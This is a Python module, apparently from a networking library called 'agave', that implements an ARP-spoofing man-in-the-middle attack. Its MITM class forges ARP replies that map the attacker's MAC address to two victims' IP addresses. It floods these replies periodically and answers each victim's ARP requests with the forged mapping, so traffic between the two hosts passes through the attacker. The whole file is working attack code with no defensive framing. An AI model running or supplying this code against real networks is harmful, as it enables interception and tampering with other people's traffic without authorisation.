import time
from typing import Tuple
from agave.frames import ethernet, arp
from agave.frames.ethernet import MACAddress
from agave.modules.nic.interfaces import NetworkInterface
from .utils import ARPReaderLoop, HOST


class MITM(ARPReaderLoop):

	def __init__(
		self,
		interface: NetworkInterface,
		alice: HOST,
		bob: HOST,
		flood_interval: float = 1
	):
		super().__init__(selector_timeout=flood_interval)
		self.message_for_bob = arp.ARP.is_at(
			interface.mac.address, alice[1],
			bob[0].address, bob[1]
		)
		self.message_for_alice = arp.ARP.is_at(
			interface.mac.address, bob[1],
			alice[0].address, alice[1]
		)
		self.gratuitous_timeout = flood_interval
		self.last_gratuitous = time.time()
		self.interface = (interface.name, 1)
		self.bob_ip = bob[1].packed
		self.alice_ip = alice[1].packed

	def send_gratuitous(self):
		self._sock.sendto(self.message_for_bob, self.interface)
		self._sock.sendto(self.message_for_alice, self.interface)
		self.last_gratuitous = time.time()

	def should_send_gratuitous(self):
		return self.gratuitous_timeout < (time.time() - self.last_gratuitous)

	def process(self, address: Tuple, eth: ethernet.Ethernet, frame: arp.ARP):
		if frame.operation == arp.OPERATION_REQUEST:
			# if alice requests bob's mac
			if (frame.target_protocol_address == self.bob_ip and
					frame.sender_protocol_address == self.alice_ip):
				self._sock.sendto(self.message_for_alice, self.interface)
			# if bob requests alice's mac
			elif (frame.target_protocol_address == self.alice_ip and
					frame.sender_protocol_address == self.bob_ip):
				self._sock.sendto(self.message_for_bob, self.interface)

	def after(self):
		if self.should_send_gratuitous():
			self.send_gratuitous()

	def run(self):
		self.send_gratuitous()
		super().run()
